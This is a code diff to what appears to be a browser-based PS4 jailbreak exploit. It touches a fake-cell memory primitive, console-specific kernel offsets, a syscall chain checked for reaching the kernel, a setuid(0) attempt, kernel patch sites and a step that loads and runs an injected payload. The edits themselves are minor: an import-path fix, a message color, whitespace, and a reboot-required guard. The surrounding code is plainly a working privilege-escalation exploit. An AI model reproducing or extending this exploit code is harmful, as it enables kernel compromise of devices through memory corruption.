@@ -1,7 +1,7 @@
 // ?v=10 must match mem.js's specifier EXACTLY or core.js builds a second
 // module record and releaseFakeCell() (only call site: mem.js:662) reaches a
 // virgin instance, pinning ~137 MB for the life of the page.
-import { establishPrimitive } from "./core.js";
+import { establishPrimitive } from "./core.js?v=10";
 import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
 import { offsetsFor } from "./ps4_offsets.js";
@@ -49,7 +49,7 @@ function hostFail() {
     var m = document.getElementById("msgs");
     if (m) {
         m.innerHTML = "Gagal Memuat! Mulai Ulang Konsol Anda ...";
-        m.style.color = "yellow";
+        m.style.color = "#ff0000";
     }
 }
 
@@ -447,7 +447,7 @@ let payloadRunning = false;
         const pid = sc(SYS.getpid).i32;
         check("chain-reaches-kernel", pid > 0,
             "pid=" + pid + " uid=" + sc(SYS.getuid).i32);
-
+			
         try {
             var uid0 = sc(SYS.getuid).i32;
             var su0 = sc(SYS.setuid, 0).i32;
@@ -2322,7 +2322,9 @@ let payloadRunning = false;
                             + " sites=" + KPATCH_JMP_SITES.length);
                     }
 
-                    if (payload && (kpatched || params.get("payload") === "1")
+                    if (rebootRequired) {
+                        mark("PAYLOAD-SKIPPED", "cleanup incomplete / zone dirty -- reboot required");
+                    } else if (payload && (kpatched || params.get("payload") === "1")
                         && params.get("payload") !== "0") {
                         state("payload...", "warn");
                         const sz = (payload.length + 0x3fff) & ~0x3fff;
@@ -2363,7 +2365,7 @@ let payloadRunning = false;
                                     if (payloadRunning) {
                                         mark("PAYLOAD-RUNNING",
                                             "bytes=" + payload.length + " entry=" + entry);
-                                        hostOk();
+										hostOk();
                                     }
                                 }
                             }
